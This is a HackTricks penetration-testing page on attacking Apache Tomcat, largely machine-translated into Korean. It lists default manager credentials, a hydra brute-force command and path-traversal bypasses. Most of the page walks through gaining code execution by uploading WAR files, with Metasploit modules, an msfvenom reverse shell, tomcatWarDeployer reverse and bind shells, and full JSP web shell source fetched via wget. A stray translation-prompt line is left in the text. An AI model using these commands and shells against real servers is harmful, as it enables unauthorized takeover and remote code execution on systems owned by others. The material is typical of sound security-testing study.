# Tomcat

{{#include ../../../banners/hacktricks-training.md}}

## Discovery

- 일반적으로 **포트 8080**에서 실행됩니다.
- **일반적인 Tomcat 오류:**

<figure><img src="../../../images/image (150).png" alt=""><figcaption></figcaption></figure>

## Enumeration

### **버전 식별**

Apache Tomcat의 버전을 찾기 위해 간단한 명령을 실행할 수 있습니다:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
이것은 문서 인덱스 페이지에서 "Tomcat"이라는 용어를 검색하여 HTML 응답의 제목 태그에서 버전을 드러냅니다.

### **매니저 파일 위치**

**`/manager`** 및 **`/host-manager`** 디렉토리의 정확한 위치를 식별하는 것은 중요합니다. 이름이 변경될 수 있기 때문입니다. 이러한 페이지를 찾기 위해 무차별 대입 검색을 권장합니다.

### **사용자 이름 열거**

Tomcat 6보다 이전 버전에서는 다음을 통해 사용자 이름을 열거할 수 있습니다:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **기본 자격 증명**

**`/manager/html`** 디렉토리는 WAR 파일의 업로드 및 배포를 허용하므로 특히 민감합니다. 이 디렉토리는 기본 HTTP 인증으로 보호되며, 일반적인 자격 증명은 다음과 같습니다:

- admin:admin
- tomcat:tomcat
- admin:
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

이 자격 증명은 다음을 사용하여 테스트할 수 있습니다:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
또 다른 주목할 만한 디렉토리는 **`/manager/status`**로, Tomcat 및 OS 버전을 표시하여 취약점 식별에 도움을 줍니다.

### **무차별 대입 공격**

관리자 디렉토리에 무차별 대입 공격을 시도하려면 다음을 사용할 수 있습니다:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Along with setting various parameters in Metasploit to target a specific host.

## Common Vulnerabilities

### **Password Backtrace Disclosure**

`/auth.jsp`에 접근하면 운이 좋을 경우 백트레이스에서 비밀번호가 노출될 수 있습니다.

### **Double URL Encoding**

`mod_jk`의 CVE-2007-1860 취약점은 이중 URL 인코딩 경로 탐색을 허용하여, 특별히 제작된 URL을 통해 관리 인터페이스에 무단 접근을 가능하게 합니다.

Tomcat의 관리 웹에 접근하려면 다음으로 이동하십시오: `pathTomcat/%252E%252E/manager/html`

### /examples

Apache Tomcat 버전 4.x에서 7.x까지는 정보 유출 및 교차 사이트 스크립팅(XSS) 공격에 취약한 예제 스크립트를 포함하고 있습니다. 이러한 스크립트는 포괄적으로 나열되어 있으며, 무단 접근 및 잠재적 악용 여부를 확인해야 합니다. [자세한 정보는 여기에서 확인하세요](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

- /examples/jsp/num/numguess.jsp
- /examples/jsp/dates/date.jsp
- /examples/jsp/snp/snoop.jsp
- /examples/jsp/error/error.html
- /examples/jsp/sessions/carts.html
- /examples/jsp/checkbox/check.html
- /examples/jsp/colors/colors.html
- /examples/jsp/cal/login.html
- /examples/jsp/include/include.jsp
- /examples/jsp/forward/forward.jsp
- /examples/jsp/plugin/plugin.jsp
- /examples/jsp/jsptoserv/jsptoservlet.jsp
- /examples/jsp/simpletag/foo.jsp
- /examples/jsp/mail/sendmail.jsp
- /examples/servlet/HelloWorldExample
- /examples/servlet/RequestInfoExample
- /examples/servlet/RequestHeaderExample
- /examples/servlet/RequestParamExample
- /examples/servlet/CookieExample
- /examples/servlet/JndiServlet
- /examples/servlet/SessionExample
- /tomcat-docs/appdev/sample/web/hello.jsp

### **Path Traversal Exploit**

일부 [**취약한 Tomcat 구성**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)에서는 경로 `/..;/`를 사용하여 Tomcat의 보호된 디렉토리에 접근할 수 있습니다.

예를 들어, `www.vulnerable.com/lalala/..;/manager/html`에 접근하여 **Tomcat 관리자** 페이지에 접근할 수 있을 것입니다.

**또 다른 방법**으로는 이 트릭을 사용하여 보호된 경로를 우회하는 것이며, `http://www.vulnerable.com/;param=value/manager/html`에 접근하는 것입니다.

## RCE

마지막으로, Tomcat 웹 애플리케이션 관리에 접근할 수 있다면, **.war 파일을 업로드하고 배포할 수 있습니다 (코드 실행)**.

### Limitations

**충분한 권한**(역할: **admin**, **manager** 및 **manager-script**)이 있는 경우에만 WAR를 배포할 수 있습니다. 이러한 세부정보는 일반적으로 `/usr/share/tomcat9/etc/tomcat-users.xml`에 정의된 _tomcat-users.xml_에서 찾을 수 있습니다(버전마다 다를 수 있음) (자세한 내용은 [POST ](#post)section을 참조하십시오).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### 메타스플로잇
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Reverse Shell

1. 배포할 war 파일 생성:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LPORT> -f war -o revshell.war
```
2. `revshell.war` 파일을 업로드하고 접근합니다 (`/revshell/`):

### [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)를 이용한 바인드 및 리버스 셸

일부 시나리오에서는 이 방법이 작동하지 않습니다 (예: 구버전의 sun)

#### 다운로드
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### 리버스 셸
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### 바인드 셸
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### Using [Culsterd](https://github.com/hatRiot/clusterd)
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### 수동 방법 - 웹 셸

**index.jsp**를 다음 [content](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)로 생성합니다:
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
이것을 설치할 수도 있습니다 (업로드, 다운로드 및 명령 실행을 허용합니다): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### Manual Method 2

[JSP 웹 셸](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)과 같은 것을 가져와 WAR 파일을 생성합니다:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Tomcat 자격 증명 파일의 이름은 `tomcat-users.xml`이며, 이 파일은 tomcat 내에서 사용자의 역할을 나타냅니다.
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Please provide the text you would like me to translate.
```xml
[...]
<!--
By default, no user is included in the "manager-gui" role required
to operate the "/manager/html" web application.  If you wish to use this app,
you must define such a user - the username and password are arbitrary.

Built-in Tomcat manager roles:
- manager-gui    - allows access to the HTML GUI and the status pages
- manager-script - allows access to the HTTP API and the status pages
- manager-jmx    - allows access to the JMX proxy and the status pages
- manager-status - allows access to the status pages only
-->
[...]
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```
## 다른 톰캣 스캐닝 도구

- [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## 참고문헌

- [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
- [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)

{{#include ../../../banners/hacktricks-training.md}}
